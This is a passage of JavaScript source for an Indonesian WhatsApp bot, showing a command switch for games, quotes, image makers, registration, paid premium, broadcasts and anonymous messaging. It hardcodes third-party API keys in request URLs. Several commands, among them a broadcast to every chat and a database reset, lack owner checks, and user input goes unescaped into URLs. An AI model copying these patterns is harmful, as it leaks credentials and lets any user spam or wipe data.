const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${text}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: msg })
}
break

case 'bisakah':
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Gabisa','TENTU PASTI KAMU BISA!!!!','Bisa Banget','Nggak Kek Nya🗿','Nggak']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: msg })
break

case 'bagaimanakah':
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara menjadi wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee','Mana saya tau, saya kan bot🗿']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
conn.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: msg })
break

case 'apakah':
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
conn.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: msg })
break

case 'truth':
let kuku = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/truth.json`)
let yoo = kuku[Math.floor(Math.random() * kuku.length)] 
let truthnya = `「 Truth  Or Dare 」

User : @${sender.split('@')[0]} 
Pilihan : ${command}

_「 ${yoo} 」_
`
let cemeang = [sender]
conn.sendButtonText(from, [{ buttonId: `.truth`, buttonText: { displayText: '⭕ Truth' }, type: 1 }, { buttonId: `.etsgdjdjdjeiejetikddhkdj`, buttonText: { displayText: '🔍 Ajak Teman' }, type: 1 }], truthnya, setting.footer, msg, {mentions: cemeang}) 
break

case 'dare':
let jempol = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/truth.json`)
woke = jempol[Math.floor(Math.random() * jempol.length)] 
let darehnya = `「 Truth  Or Dare 」

User : @${sender.split('@')[0]} 
Pilihan : ${command}

_「 ${woke} 」_
`
let pupu = [sender]
conn.sendButtonText(from, [{ buttonId: `.truth`, buttonText: { displayText: '😏 Dare' }, type: 1 }, { buttonId: `.etsgdjdjdjeiejetikddhkdj`, buttonText: { displayText: '🔍 Ajak Teman' }, type: 1 }], darehnya, setting.footer, msg, {mentions: pupu}) 
break

case 'etsgdjdjdjeiejetikddhkdj':
let member = participants.map(u => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `「 Undangan Bermain  」 

Hallo @${jodoh.split('@')[0]}, Kamu Diajak Oleh @${sender.split('@')[0]} Untuk Bermain Truth Or Dare️
`
let ments = [sender, jodoh]
let buttons = [
{ buttonId: `sfnegjyjyysoh`, buttonText: { displayText: 'Ok' }, type: 1 }]
await conn.sendButtonText(from, buttons, jawab, setting.footer, msg, {mentions: ments})
break

case 'sfnegjyjyysoh':
return reply ('Selamat Bermain, Dan Diharapkan Untuk Tidak Spam ☺️')
break


case 'fakta': {
const x16 = await fetchJson("https://api.popcat.xyz/fact")
const x17 = await fetchJson(`https://api.popcat.xyz/translate?to=id&text=${x16.fact}`)
//replay(x17.translated)
let ogeh = `*———「 Fakta 」———*\n\n`
conn.sendButtonText(from, [{ buttonId: '.fakta', buttonText: { displayText: 'Next' }, type: 1 }], ogeh + x17.translated + `\n`, setting.footer, msg) 
}
break

case 'crinj': {
const x18 = await fetchJson("https://api.popcat.xyz/joke")
const x19 = await fetchJson(`https://api.popcat.xyz/translate?to=id&text=${x18.joke}`)
//replay(x19.translated)
conn.sendButtonText(from, [{ buttonId: '.crinj', buttonText: { displayText: 'Next' }, type: 1 }], `\n` + x19.translated + `\n`, setting.footer, msg) 
}
break

case 'motivasi':
let kabau5 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/motivasi.json`)
let pitih5 = kabau5[Math.floor(Math.random() * kabau5.length)] 
let mmotivasi = `_「 Random Motivasi 」_

${pitih5}
`
conn.sendButtonText(from, [{ buttonId: `.motivasi`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mmotivasi, setting.footer, msg)
break

case 'nurhadi':
let kabau4 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/nurhadi.json`)
let pitih4 = kabau4[Math.floor(Math.random() * kabau4.length)] 
let mnurhadi = `_「 Quotes Nurhadi 」_

${pitih4}
`
conn.sendButtonText(from, [{ buttonId: `.nurhadi`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mnurhadi, setting.footer, msg)
break

case 'ngawur':
let kabau3 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/ngawur.json`)
let pitih3 = kabau3[Math.floor(Math.random() * kabau3.length)] 
let mngawur = `_「 Random Ngawur 」_

${pitih3}
`
conn.sendButtonText(from, [{ buttonId: `.ngawur`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mngawur, setting.footer, msg)
break

case 'sad':
case 'sedih':
case 'galau':
let kabau2 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/kata_galau.json`)
let pitih2 = kabau2[Math.floor(Math.random() * kabau2.length)] 
let mgalau = `_「 Random Galau 」_

${pitih2}
`
conn.sendButtonText(from, [{ buttonId: `.galau`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mgalau, setting.footer, msg)
break

case 'gombal':
let kabau1 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/gombal.json`)
let pitih1 = kabau1[Math.floor(Math.random() * kabau1.length)] 
let mgombal = `_「 Random Gombal 」_

${pitih1}
`
conn.sendButtonText(from, [{ buttonId: `.gombal`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mgombal, setting.footer, msg)
break

case 'nyindir':
let mkabau = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/nyindir.json`)
let pitih = mkabau[Math.floor(Math.random() * mkabau.length)] 
let myindir = `_「 Random Nyindir 」_

${pitih}
`
conn.sendButtonText(from, [{ buttonId: `.nyindir`, buttonText: { displayText: '➡️ Next' }, type: 1 }], myindir, setting.footer, msg)
break

case 'fiersa':
let kabau = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/fiersa.json`)
let wuwu = kabau[Math.floor(Math.random() * kabau.length)] 
let mfiersa = `_「 Random Fiersa 」_

${wuwu}
`
conn.sendButtonText(from, [{ buttonId: `.fiersa`, buttonText: { displayText: '➡️ Next' }, type: 1 }], mfiersa, setting.footer, msg)
break

case 'bacot':
let jawi = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/bacot.json`)
let uwuw = jawi[Math.floor(Math.random() * jawi.length)] 
let bacotan = `_「 Random Bacot 」_

${uwuw}
`
conn.sendButtonText(from, [{ buttonId: `.bacot`, buttonText: { displayText: '➡️ Next' }, type: 1 }], bacotan, setting.footer, msg)
break

case 'quotes': { 
let anu = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/quotes.json`)
let yoo = anu[Math.floor(Math.random() * anu.length)] 
let txt = `_「 Random Quotes 」_

${yoo.quotes}
`
conn.sendButtonText(from, [{ buttonId: '.quotes', buttonText: { displayText: '➡️ Next Quotes' }, type: 1 }], txt, `~ ${yoo.author}`, msg) 
}
break

case 'bucin':
let samuik = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/bucin.json`)
let www = samuik[Math.floor(Math.random() * samuik.length)] 
let bucinan = `_「 Random Bucin 」_

${www}
`
conn.sendButtonText(from, [{ buttonId: `.bucin`, buttonText: { displayText: '➡️ Next' }, type: 1 }], bucinan, setting.footer, msg)
break

case 'senja':
let kabau6 = await fetchJson(`https://raw.githubusercontent.com/Arulllllllllllll/Databasee/main/Random/quotes_senja.json`)
let pitih6 = kabau6[Math.floor(Math.random() * kabau6.length)] 
let msenja = `_「 Quotes Senja 」_

${pitih6}
`
conn.sendButtonText(from, [{ buttonId: `.senja`, buttonText: { displayText: '➡️ Next' }, type: 1 }], msenja, setting.footer, msg)
break

case 'isgd': 
if (!q) return reply (`*Contoh :*\n${command} http://google.com`)
let isgd = await fetchJson(`https://api-yogipw.herokuapp.com/api/short/isgd?url=${q}`)
let isgd2 = `Link Original : ${q}\nLink Shortlink : ${isgd.result.link}`
conn.sendButtonText(from, button_nye, isgd2, setting.footer, msg )
break

case 'glitch': 
case 'devil': 
case 'anciented':
case 'batman':
case 'black':
case 'carved':
case 'demon':
case 'diamond':
case 'golden3d':
case 'blackpinkrose':
case 'blackpinkstyle':
case 'bussines3d':
case 'graffitiart':
case 'harrypotter':
case 'holographic':
case 'joker':
case 'led':
case 'magma':
case 'marvel':
case 'matrix':
case 'neon':
case 'neon3d':
case 'neonblackpink':
case 'rainbow':
case 'slicetext':
case 'spooky':
case 'summerneon':
case 'thor':
case 'thunder':
case 'thunder2':
case 'transformer':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply ('Masukan Teks')
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.itsrose.my.id/textpro/${command}?text=${q}` }, caption: '✅ Done' }, { quoted: msg })
.catch(err => {
return reply('Error!')
})
break

case 'verify':
case 'daftar':
case 'verifikasi':
case 'verification': {
if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(18)}`
var user_name = `${pushname}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, 2, null))
mentions(`Menyimpan Data User @${sender.split("@")[0]}`, [sender])
await sleep(3000)
var verify_teks =`*───「 Pendaftaran Berhasil 」────*

○ Name : ${user_name}
○ Number : @${sender.split('@')[0]}
○ Seri : ${res_us}`
var buttonMessage = {
text: verify_teks,
footer: setting.footer,
mentions: [sender],
buttons: [
{ buttonId: '.menu', buttonText: {displayText: '️Menu'}, type: 1}
],
headerType: 1
}
conn.sendMessage(from, buttonMessage, {quoted:msg})
}
break

case 'menu':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
var no = 1
var ad = 1
let namenya = `${cekUser("name", sender)}`
let premnya = `${cekUser("premium", sender)? 'Aktif':'Tidak'}`
let usernya = `${("id", db_user).length}`
let romnya = `${db_menfes.length}`
const mark_slebew = '62895340684706@s.whatsapp.net'
var footer_nya =` _Powered By @${mark_slebew.split("@")[0]}_`
var menu_nya =`${listmenu(sender,prefix,ad,namenya,premnya,usernya,romnya,tanggal,jam,no,ucapanWaktu)}`
let btn_menu = [
{buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner' }, type: 1 },
{buttonId: `${prefix}rules`, buttonText: { displayText: 'Rules' }, type: 1 }
]
var but_menu = {
text: menu_nya,
footer: footer_nya,
buttons: btn_menu,
mentions: [sender, mark_slebew],
headerType: 1
}
conn.sendMessage(from, but_menu, {quoted:msg})
}
break

case 'donate':
case 'donasi':{
var monoSpace = '```'
let cekName = `${cekUser("name", sender)}`
reply(donasiBot(cekName,ucapanWaktu))
}
break

case 'digital':
case 'quoteser':
case 'quobucin':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Contoh:\n${prefix+command} saya bukan wibu`)
reply(mess.wait)
var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`
conn.sendMessage(from, { image:{url:buc}, caption:'Done!'}, {quoted:msg})
}
break

case 'mediafire':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply('Link yang kamu berikan tidak valid')
reply('*Mengunduh Media...*')
let baby1 = await mediafireDl(`${isLinks}`)
if (baby1[0].size.split('MB')[0] >= 100) return reply('File Melebihi Batas '+util.format(baby1))
let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Type* : ${baby1[0].mime}

_Wait Mengirim file..._
`
reply(result4)
if (isGroup) return reply('*document udah dikirim ke chat pribadi bot.*')
conn.sendMessage(sender, {document:{url:baby1[0].link}, fileName:baby1[0].nama, mimetype: baby1[0].mime}, {quoted:msg}).catch ((err) => reply('Gagal saat mendownload File'))
break

case 'grupbot':
case 'groupbot':
case 'gcbot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(`${setting.group.judul}
${setting.group.link}`)
break
case 'infobot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var teks_info = `*Bot Info*

• Author : @${itu_mark.split('@')[0]}
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )
• Room Chat : ( ${db_menfes.length} )`
let btn_info = [
{buttonId: `${prefix}menu`, buttonText: { displayText: 'Menu' }, type: 1 }
]
var but_info = {
text: teks_info,
footer: setting.footer,
buttons: btn_info,
mentions: [itu_mark],
headerType: 1
}
conn.sendMessage(from, but_info, {quoted:msg})
break

case 'ssweb-pc':
case 'ssweb-hp':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter url\n*Contoh:*\n${prefix+command} https://google.com`)
reply(mess.wait)
let anu =`https://leyscoders-api.herokuapp.com/api/${command}?url=${q}&apikey=IkyOgiwara`
conn.sendMessage(from, { image: {url: anu}, caption: 'Done!'}, {quoted:msg})
}
break

case 'setfooter':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n#setfooter ${setting.footer}`)
setting.footer = q
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti footer')
break

case 'runtime':
case 'tes':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*Runtime :* ${runtime(process.uptime())}`)
break

case 'rules':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_rules =`${rulesBot()}`
conn.sendMessage(from, { text: text_rules })
}
break

case 'user':
case 'db':{
if (!isOwner) return reply(mess.OnlyOwner)
let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
let no = 1
let teks_db =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )
*• Room Chat :* ( ${db_menfes.length} )\n\n`
for (let x of xx_us){
teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
}
reply(teks_db)
}
break

case 'addprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#addprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
setUser("±premium", number_one, true)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
}
break
case 'delprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#delprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
setUser("±premium", number_one, false)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
}
break
case 'owner':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var owner_Nya = setting.ownerNumber
sendContact(from, owner_Nya, setting.ownerName, msg)
}
break

case 'room':{
if (!isOwner) return reply(mess.OnlyOwner)
var room =`*CHAT ANONYMOUS*\n\n*TOTAL ROOM : ${anonymous.length}*\n\n`
var no = 1
for (let x of anonymous){
room +=`*ID ROOM ${x.id}*
*CHAT1: @${x.a.split('@')[0]}*
*CHAT2: @${x.b.split('@')[0]}*
*STATUS: ${x.state}*\n\n`
}
reply(room)
}
break

case 'daftarprem':
case 'buyprem':
mentions(`*Buy Premium*

*List Harga*
Rp 5.000 / Minggu
Rp 10.000 / Bulan
Rp 15.000 Permanen 

*Keuntungan Premium*
- _Add Bot 1 Group_
- _Unlock Fitur Premium_

*Tertarik? Hubungi Owner* @${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
break

case 'sewabot':
case 'sewa':
mentions(`*SEWA BOT*

*List Harga*
3 Hari : Rp 2.000
1 Minggu : Rp 5.000
Permanen : Rp 20.000 + Premium 

Transfer Via Dana

*Keuntungan Sewabot*
- Add Bot 1 Group
- Bot On 24 Jam

*Tertarik? Hubungi Owner* @${setting.ChatOwner.split('@')[0]}`, [setting.ChatOwner])
break

case 'cekprem':{
mentions(`*CEK PREMIUM*
_• ID : @${cekUser("id", sender).split('@')[0]}_
_• Status : ${cekUser("premium", sender)? 'Aktif':'Tidak'}_`, [sender])
}
break

case 'resetdb':{
if (!isOwner) return reply(mess.OnlyOwner)
let para_kos = "[]"
db_user.splice(para_kos)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
await sleep(1000)
db_menfes.splice(para_kos)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
reply('Sukses restart database')
}
break

case 'resetlist':
db_respon_list.splice('[]')
fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
reply('Sukses Reset List Message')
break

// BROADCAST
case 'bc':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
let data_teks = `${q}`
for (let i of db_orang){
conn.sendButtonText(i.id,
[{ 
buttonId: `.menu`, 
buttonText: { 
displayText: '🎭 Menu' 
}, type: 1 
}, {
buttonId: '.owner', 
buttonText: { 
displayText: 'Owner 👤' 
}, type: 1 
}], data_teks, '© broadcast', bcnye) 
}
reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
}
break

case 'bc2':
let ano = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${ano.length} Chat\nWaktu Selesai ${ano.length * 1.5} detik`)
for (let yoi of ano) {
await sleep(1500)
let txt = `${q}`
conn.sendButtonText(yoi,
[{ 
buttonId: `.menu`, 
buttonText: { 
displayText: '🎭 Menu' 
}, type: 1 
}, {
buttonId: '.owner', 
buttonText: { 
displayText: 'Owner 👤' 
}, type: 1 
}], txt, '© broadcast', bcnye) 
}
break

case 'bcvideo':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var bc_video = `./sticker/${setting.ownerNumber.split('@')[0]}.mp4`
for (let i of db_user){
conn.sendMessage(i.id, {video:{url:bc_video}, caption: `${q ? q : ''}`}, { quoted : bcnye })
await sleep(2000)
}
reply(`*Sukses mengirim broadcast video ke ${db_user.length} user*`)
fs.unlinkSync(bc_video)
} else {
reply(`*kirim video dengan caption ${prefix+command} atau reply video dengan pesan ${prefix+command}*`)
}
}
break

case 'bcimage':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
var bc_image = `./sticker/${setting.ownerNumber.split('@')[0]}.jpg`
for (let i of db_user){
conn.sendMessage(i.id, {image:{url:bc_image}, caption: `${q ? q : ''}`}, { quoted : bcnye })
await sleep(2000)
}
reply(`*Sukses mengirim broadcast image ke ${db_user.length} user*`)
fs.unlinkSync(bc_image)
} else {
reply(`*kirim gambar dengan caption ${prefix+command} atau reply gambar dengan pesan ${prefix+command}*`)
}
}
break

case 'bcaudio':{
if (!isOwner) return reply(mess.OnlyOwner)
if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
var bc_audio = `./sticker/${setting.ownerNumber.split('@')[0]}.mp3`
for (let i of db_user){
conn.sendMessage(i.id, {audio:{url:bc_audio}, mimetype:'audio/mpeg', fileName:'broadcast.mp3'}, { quoted : bcnye })
await sleep(2000)
}
reply(`*Sukses mengirim broadcast audio ke ${db_user.length} user*`)
fs.unlinkSync(bc_audio)
} else {
reply(`*reply audio dengan pesan ${prefix+command}*`)
}
}
break

// OWNER ONLY
case 'setexif':
case 'exif':
case 'setwm':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n.setwm pack|author')
let nama_Pack = q.split('|')[0]
let author_Pack = q.split('|')[1]
if (!nama_Pack) return reply('*Contoh:*\n.setwm pack|author')
if (!author_Pack) return reply('*Contoh:*\n.setwm pack|author')
exif.create(nama_Pack, author_Pack)
reply('Sukses membuat exif')
}
break

case 'buat_room_chat':{
var id_satu = q.split('|')[0]
var id_dua = q.split('|')[1]
var id_rom = q.split('|')[2]
db_menfes.push({"id": id_satu, "teman": id_dua})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
db_menfes.push({"id": id_dua, "teman": id_satu})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, 2, null))
var tulis_pesan = `*───「 Chat Anonymous Terhubung 」───*

Silahkan Kirim Pesan

Ketik .stopchat
Untuk Menghapus Sesi Chat

Note:
Chat Ini Bersifat Anonim (Rahasia), Dan
Kamu Bisa Bales Chat Partner Kamu
Tanpa Harus Ketik Menfess Terlebih Dahulu 

Dilarang Spam / Telpon Bot
Langgar = Blok Permanen

Id Room : ${id_rom}`
var buttonMessage = {
text: tulis_pesan,
footer: 'klik button untuk menghapus sesi chat',
buttons: [
{ buttonId: '.stopchat', buttonText: {displayText: '️Berhenti'}, type: 1}
],
headerType: 1
}
conn.sendMessage(id_satu, buttonMessage)
conn.sendMessage(id_dua, buttonMessage)
}
break

case 'stopchat':
if (cekPesan("id", sender) == null) return reply(`Kamu Tidak Didalam Roomchat, Silahkan Buat Room Terlebih Dahulu.\n\n*Format :*\n.menfess num|nama|pes\n\n*Contoh :*\n.menfess 62895340684706|bot|hai\n\n*Note:*\n62895340684706 - benar (✅)\n+62 895 3406 84706 - salah (❌)`)
if (isGroup) return reply(mess.OnlyPM)
var aku = sender
var dia = cekPesan("teman", aku)
var teks_aku = `[✓] Berhasil Memberhentikan Chat`
setRoom("±id", dia, null)
setRoom("±teman", dia, null)
await sleep(2000)
conn.sendMessage(aku,{text:teks_aku})
setRoom("±id", aku, null)
setRoom("±teman", aku, null)
var teks_dia = `[✓] Room Chat Telah Dihentikan\nOleh Teman Chat Kamu👤`
conn.sendMessage(dia,{text:teks_dia})
db_menfes.splice('[]')
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
break

case 'secretchat':
case 'menfes': 
case 'menfess':{
if (cekPesan("id", sender) !== null) return reply("Kamu Sedang Didalam Roomchat!! Ketik *#stopchat* Untuk Menghapus Sesi Chat.")
if (!q) return reply(`Format Fitur Menfess\n\n_*Format*_\n${prefix+command} wa|pengirim|pesan\n\n_*Contoh*_\n${prefix+command} 62895340684706|bot|hai\n\n*Note :*\nBerawal Dari 628xxx Tanpa Spasi`)
let num = q.split('|')[0]
let nama_pengirim = q.split('|')[1]
let pesan_teman = q.split('|')[2]
var cekap = await conn.onWhatsApp(num+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Nomor +${num}\nTidak Terdaftar Di WhatsApp`)
let roomC = `#${makeid(10)}`
if (num == botNumber.split('@')[0]) return reply('Itu Kan Nomor Bot🗿')
if (num == sender.split('@')[0]) return reply('Menfes Ke Nomor Sendiri:V\nCapek Ya? Semangat🗿')
if (!num) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!nama_pengirim) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
if (!pesan_teman) return reply(`Harus di isi semua !!\nex : ${prefix+command} 62857xxx|nama|hallo\n\nnomor hp tanpa spasi`)
let text_menfess = `Hallo Kak ${ucapanWaktu}
Ada Menfess Nih

*• Dari :* ${nama_pengirim}
*• Pesan :* ${pesan_teman}

_Pesan ini ditulis oleh seseorang_
_Bot hanya menyampaikan saja._`
let btn_menfes = [{ buttonId: `${prefix}buat_room_chat ${sender}|${num}@s.whatsapp.net|${roomC}`, buttonText: { displayText: 'Balas Menfess ✍️' }, type: 1 }]
var button_menfess = {
text: text_menfess,
footer: 'Klik button untuk membalas chat.',
buttons: btn_menfes,
headerType: 1
}
conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
reply('Menfess Kamu Sudah Terkirim, Moga Aja Dibales🗿')
if (isGroup) return reply("Pesan Menfess Kamu Sudah Dikirim.")
}
break
case 'sc': case 'script':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_buysc =`*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*

*Admin*
*Wa.me/62895340684706*

_*Harga Normal :*_ ~Rp100.000~
*_Harga Promo : Rp70.000_*
`
conn.sendMessage(from, { text: text_buysc }, { quoted: msg })
}
break

case 'request': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} tambahin fitur anti jomblo min`)
var teks = `*————「 REQUEST FITUR 」————*\n\n`
var teks1 = `Nama : ${pushname}\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `Succes Send To Owner`
var bg_lexxy = '62895340684706@s.whatsapp.net'
conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
conn.sendMessage(from, {text: teks2, mentions:[sender]}, {quoted:msg})
}
break

case 'report': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
var teks = `*————「 REPORT FITUR 」————*\n\n`
var teks1 = `Nama : ${pushname}\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var bg_lexxy = '62895340684706@s.whatsapp.net'
conn.sendMessage(bg_lexxy, {text: teks + teks1, mentions:[sender]}, {quoted:msg})
conn.sendMessage(from, {text: 'Terima Kasih Atas Laporannya, Fitur Akan Diperbaiki Oleh Owner Secepatnya', mentions:[sender]}, {quoted:msg})
}
break

case 'sendsesi': {
if (!isOwner) return reply(mess.OnlyOwner)
reply('please wait..')
await sleep(3000)

// Read Database
var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)

// Sending Document
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:msg})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:msg})
}
break
// CASE BY LEXXY OFFICIAL
// JANGAN DI EDIT LAGI YA
case 'pricelist': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`)
if (feta.status == false) return reply(feta.data.msg)
let list = '*List Harga Layanan*\n\n'
for (let L of feta.data) {
list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`
}
conn.sendMessage(from, {text: list}, {quoted:msg})
}
break
case 'komisi':
if (!isOwner) return reply(mess.OnlyOwner)
var komisi = await fetchJson(`http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop`)
let reskomisi = `Hallo owner Berikut komisi anda\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`
conn.sendMessage(from, {text: reskomisi }, {quoted:msg})
break
case 'tk': case 'tarikkomisi': {
if (!isOwner) return reply(mess.OnlyOwner)
